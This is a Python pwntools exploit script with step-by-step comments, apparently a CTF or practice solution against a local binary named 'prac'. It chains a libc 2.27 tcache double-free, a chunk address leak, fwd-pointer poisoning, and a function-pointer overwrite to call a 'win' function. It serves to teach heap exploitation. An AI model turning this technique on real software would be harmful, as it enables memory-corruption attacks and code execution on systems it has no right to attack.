#!/usr/bin/python3

'''
DISCLAIMER: Works on my machine™
'''

from pwn import *

global p
p = process("./prac")
ELF = p.elf

def menu():
    p.recvuntil("Choice: ")

def make(index, name):
    log.info("Make: {}".format(index))
    p.sendline("a")
    p.recvuntil("Clone ID:", timeout=0.1)
    p.sendline(str(index))
    p.recvuntil("Enter Name")
    p.sendline(name)
    menu()


def edit(index, name):
    log.info("Edit: {}".format(index))
    p.sendline("c")
    p.recvuntil("Clone ID: ", timeout=0.1)
    p.sendline(str(index))
    p.recvuntil("Enter Name")
    p.sendline(name)
    menu()


def kill(index):
    log.info("Kill: {}".format(index))
    p.sendline("b")
    p.recvuntil("Clone ID:")
    p.sendline(str(index))
    menu()


def view(index):
    log.info("View: {}".format(index))
    p.sendline("d")
    p.recvuntil("Clone ID: ", timeout=0.1)
    p.sendline(str(index))
    p.recvuntil("Name: ", timeout=0.1)
    result = p.recvline()
    menu()
    return result


def hint(index):
    log.info("Hint: {}".format(index))
    p.sendline("h")
    p.recvuntil("Clone ID: ", timeout=0.1)
    p.sendline(str(index))
    return p.recvline()

'''
First, create a new clone
* Doesn't matter what name we give it
'''
make(0, "AAAA")

'''
Now free the clone.
* chunk->fwd = bin.head
  * Since bin.head == NULL, chunk->fwd = NULL
* bin.head = chunk
'''
kill(0)
### State after first free ###
# bin.head = chunk -> NULL




'''
Perform a double-free exploit (not patched in libc 2.27)
* chunk->fwd = bin.head
  * Since bin.head == chunk, chunk->fwd = chunk
  * ooooh look the chunk points to itself!
* bin.head = chunk
'''
kill(0)
### State after second free ###
# bin.head = chunk -> chunk [-> chunk -> chunk -> chunk -> chunk -> ...]



'''
Now leak the 'name' of the killed clone.
* Since the name shares the same region of memory as the fwd pointer...
  We actually leak the address of the chunk!
'''
leakOfChunk = u32(view(0).strip())
log.info(f"chunk0 leaked :: {hex(leakOfChunk)}")




'''
Edit the 'name' (aka fwd pointer) of the chunk to an address that is 8 bytes after.  
This is the region of memory which should hold the hint address in a clone.
'''
edit(0, p32(leakOfChunk + 8))
### State after edit ###
# bin.head = chunk -> chunk+8 -> ???
### Note that bin.head is STILL chunk... the item after however is our edited value



'''
We want to exploit the chunk+8 (function pointer) region, but first we need to get access to it...
Create a dummy clone
'''
make(1, "BBBB")
### State after allocation
# bin.head = chunk+8 -> ???
### Chunk Data
# chunk = {
#   name = "BBBB\n\000\000", 
#   hint = 0x8048636 <hint>
# }





'''
Finally, create a new clone with the name as the win address
'''
make(2, p32(ELF.symbols['win']))
### Chunk Data
# chunk = {
#  name = "BBBB\n\000\000", 
#  hint = 0x8048b4e <win>
# }



'''
$$$
'''
hint(1)   # or hint(0), up to you

p.interactive()